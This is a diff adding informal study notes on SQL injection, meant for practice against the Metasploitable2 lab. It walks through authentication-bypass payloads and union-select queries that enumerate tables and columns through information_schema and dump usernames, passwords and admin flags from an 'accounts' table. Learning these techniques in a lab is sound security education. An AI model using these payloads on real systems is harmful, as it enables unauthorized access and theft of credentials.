@@ -1,0 +1,35 @@
+SQL INJECTION (SQLI):  (USE METASPLOITABLE2 TO PRACTICE!)
+
+TEST FOR VULNERABILITIES: 
+LOGIN WITHOUT KNOWING PASSWORD:
+
+POST METHOD SQLI:
+username = admin
+password = 1' OR 1=1# --- checks if 1 = 1 
+
+WE CAN TRY TOO: username = admin'# (after '# the rest doesn't matter (IT IS ANOTHER VULNERABILITIE)
+
+GET METHOD SQLI:
+IN THE URL FROM LOGIN PAGE WE CAN ADD '%23 witch is equale to '# but encoded in HTML 
+	(In that way we manipulate the url and query to ignor the rest of the information 	after username so it will don't matter if there is password at all
+
+MANIPULATING QUERIES MORE:
+If we know the tables name we can add in the URL between the username and password the following line (SQL QUIERY in order to retrieve more data from more users for example)
+BETWEEN USERNAME AND PASSWORD AND BEFORE %23: 
+	union select * from accounts %23 (NOT CASE-SENSITIVE IN THE URL) 
+
+MANIPULATING QUERIES MORE: (IF WE DON'T KNOW THE TABLE NAMES)
+       order by 1%23 --- It will order the result by first column (NOT CASE-SENSITIVE 	 IN    	THE URL)  
+	---------
+	union select 1, 2, 3, 4, 5 --- Shows if there are some values int those columns 	indicated by numbers (NOT CASE-SENSITIVE IN THE URL) 
+	---------
+	union select 1, database(), user(), version(), 5 --- Shows us the information 	discribed if there is such from second third and forth columns (THERE MAY BE ROOT 	LOGIN INFORMATION) (NOT CASE-SENSITIVE 	IN THE URL)
+
+	MANIPULATING QUERIES MORE:
+	union select 1, table_name, null, null, 5 from information_schema.tables (DEFAULT 	TABLE) --- It will retrieve general information about the whole databases! (NOT 	CASE-SENSITIVE 	IN THE URL)
+	---------
+	union select 1, table_name, null, null, 5 from information_schema.tables where	 	table_schema = 'owasp10' --- The same as above but filters the result only related 	to "owasp10" DATABASE! (NOT CASE-SENSITIVE IN THE URL)
+	---------
+	union select 1, column_name, null, null, 5 from information_schema.columns where	table_name = 'accounts' --- Retrieves only data from all columns in the table 	"accounts" (SOME MORE FILTERING) (NOT CASE-SENSITIVE IN THE URL)
+	---------
+	union select 1, username, password, is_admin, 5 from accounts --- Retrieve data from 	practicular columns in practicular tale (THIS IS ADVANCED HERE :)) (NOT CASE-	SENSITIVE IN THE URL)
